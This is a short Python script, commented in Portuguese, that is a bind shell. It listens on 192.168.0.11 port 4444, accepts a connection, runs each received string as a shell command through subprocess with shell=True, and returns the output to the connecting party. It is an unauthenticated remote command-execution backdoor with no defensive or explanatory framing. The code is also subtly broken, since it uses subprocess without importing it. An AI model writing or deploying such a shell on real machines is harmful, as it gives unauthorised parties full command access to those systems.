import socket

HOST = '192.168.0.11'  # Endereço IP do servidor
PORT = 4444  # Porta utilizada pelo servidor

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)

print(f'[*] Aguardando conexão em {HOST}:{PORT}')
conn, addr = s.accept()
print(f'[*] Conexão estabelecida com {addr[0]}:{addr[1]}')

while True:
    command = conn.recv(1024).decode()  # Lê os comandos do cliente
    if command == 'exit':
        conn.close()
        break
    output = subprocess.run(command, shell=True, capture_output=True)  # Executa o comando remotamente
    conn.send(output.stdout)  # Envia a saída do comando para o cliente
